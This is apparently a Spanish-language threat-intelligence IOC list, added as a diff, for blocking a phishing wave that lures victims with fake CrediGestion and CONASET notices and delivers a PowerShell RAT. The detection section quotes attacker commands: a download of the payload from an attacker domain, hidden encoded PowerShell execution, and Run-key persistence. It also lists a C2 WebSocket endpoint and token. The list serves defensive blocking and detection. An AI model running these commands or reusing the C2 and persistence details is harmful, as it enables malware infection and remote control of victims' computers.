@@ -1,0 +1,71 @@
+================================================================================
+  IOCs PARA BLOQUEO -- Phishing 2a oleada "legalnorte.cl"
+  Senuelos: CrediGestion (factura vencida) + CONASET (multa de transito)
+  Deteccion: 2026-08-31 / 2026-09-01  |  TLP:CLEAR  |  Fuente: Intellroom CTI (intellroom/IoC)
+  Defanged: reemplazar  [.] -> .   y   hxxp -> http   al aplicar.
+  Organizacion receptora: REDACTADA. Analisis completo en 01092026.txt / README.md
+  NOTA: esta oleada ENTREGA MALWARE en desktop (a diferencia de la 1a oleada).
+================================================================================
+
+[BLOQUEAR -- alta confianza]  dominios REGISTRADOS por el atacante (DNS/proxy)
+hnjixiao[.]com                 # etapa 3: aloja ym.zip (se renombra a ripxl.ps1)
+mybia2rap[.]com                # C2 del RAT -> ws://mybia2rap[.]com:8080
+credigestion[.]biz             # dominio lookalike de la marca falsa, referenciado por el kit
+   # los 3 estan tras Cloudflare -> BLOQUEAR POR DOMINIO/DNS, nunca por la IP de Cloudflare
+
+[BLOQUEAR -- alta confianza]  URL filter / proxy / WAF (rutas del kit y del payload)
+hxxps://legalnorte[.]cl//CrediGestion/FactVencida/regularice/
+hxxps://legalnorte[.]cl//Conaset/infraccione/pendiente/regularice/regularice/
+hxxps://legalnorte[.]cl/CrediGestion/FactVencida/regularice.zip
+hxxps://sbmis-mbhte[.]bangsamoro[.]gov[.]ph//e-commerce/mondaysun/VisorCredGestionxFactx.zip
+hxxps://hnjixiao[.]com/ym.zip
+hxxps://kenyasafarideals[.]com//credigestionpage/     # redirect de respaldo (go.php)
+
+[BLOQUEAR -- C2]
+ws://mybia2rap[.]com:8080       # WebSocket C2 del RAT PowerShell (puerto 8080)
+token C2: Yl3kbbb0955F          # cadena de autenticacion del implante
+
+[HASHES -- SHA256]
+c790f4bfdb9c243c3081bac0e681ddb0527e16558a51bf5f7ce45f55dccdf0b6  regularice.zip (kit de phishing)
+be5920b8c54b27c245dcee1a1c92ade4bf10d1ca6968193c3a9c8ab7643e3b60  VisorCredGestionxFactx.zip (etapa 1 - contiene .lnk)
+55d8a634d10bad022df2458cee744be1032ed316870c512fdaf6c10cb7ddf0ed  ym.zip / ripxl.ps1 (RAT PowerShell, etapa 3)
+[HASHES -- MD5]
+715dd6c165625204b9a87b627a694032  regularice.zip
+b15630e8c5ffbcc46436572c3aadcbaa  VisorCredGestionxFactx.zip
+8a3e4b48f74ba9782390c48b01f31dfa  ym.zip / ripxl.ps1
+
+[DETECTAR -- host / EDR]  artefactos del payload en el equipo
+proceso:   powershell.exe -ExecutionPolicy Bypass -EncodedCommand <base64>   (desde un .lnk)
+proceso:   powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\Public\Documents\ripxl.ps1"
+comando:   Invoke-WebRequest -Uri "https://hnjixiao[.]com/ym.zip" -OutFile "C:\Users\Public\Documents\ripxl.ps1"
+persist:   HKCU\Software\Microsoft\Windows\CurrentVersion\Run  -> "WindowsSystem" = wscript.exe "C:\Users\Public\Documents\init.vbs"
+archivos:  C:\Users\Public\Documents\{ripxl.ps1, init.vbs, ico.ico, out.txt, sil.txt, bloq.txt, removerx.bat, rmm-update.bat}
+red:       trafico WebSocket saliente a mybia2rap[.]com:8080  ·  GET a ip-api.com/json?lang=pt-BR
+artefacto: SID del equipo del constructor del .lnk -> S-1-5-21-1714787112-1154861253-1508225144-1004 (pivote forense)
+
+[CORREO -- reglas anti-phishing]
+remitente:  support@doyourbestcoaching[.]com   (From: "CrediGestion")
+remitente:  support@stopautoleaks[.]com        (From: "CONASET - Informacion")
+asunto:     "fac"
+asunto:     "Informe Online sobre multas y sanciones de transito <20+ digitos>"
+message-id: <ef7726e7309724ea2a5bf3858482711f@doyourbestcoaching.com>
+message-id: <2a377a43425c6154b2ebc96070025620@stopautoleaks.com>
+patron:     X-PHP-Originating-Script (index.php / pjvz55ss_mlr.php) = correo salido de sitio PHP comprometido
+patron:     enlace a legalnorte[.]cl con  ?hash=<email_victima>  (segmentacion; pre-rellena y rastrea)
+patron:     "no disponible en dispositivos moviles, revise desde un computador" (fuerza desktop = entrega el payload)
+
+[VIGILAR -- NO bloquear el dominio en bloque]  sitios LEGITIMOS comprometidos (victimas colaterales)
+legalnorte[.]cl                # sitio .cl legitimo (creado 2011, Google Workspace) hackeado; landing del kit
+doyourbestcoaching[.]com       # sitio legitimo comprometido usado para enviar el correo CrediGestion
+stopautoleaks[.]com            # sitio legitimo comprometido usado para enviar el correo CONASET
+sbmis-mbhte[.]bangsamoro[.]gov[.]ph   # sitio GUBERNAMENTAL (Filipinas) comprometido que aloja el payload
+kenyasafarideals[.]com         # sitio legitimo comprometido (redirect de respaldo)
+   # -> bloquear la URL/ruta especifica, reportar al dueno y a su hosting; NO tumbar el dominio entero
+
+[NO ES IOC]  no bloquear
+ip-api.com                     # servicio legitimo de geolocalizacion, usado POR el kit (no es del atacante)
+104.21.47.95 / 172.67.146.99   # IPs de Cloudflare (hnjixiao.com) -- el IOC es el DOMINIO
+172.67.166.244 / 104.21.16.82  # IPs de Cloudflare (mybia2rap.com) -- el IOC es el DOMINIO
+200.73.115.81                  # PowerHost (hosting compartido de legalnorte.cl) -- afecta a terceros
+192.190.221.127 / 8.29.155.51  # Nexcess/Liquid Web (hosting compartido de los sitios emisores)
+*.aspmx.l.google.com           # MX legitimo de Google Workspace del dominio comprometido
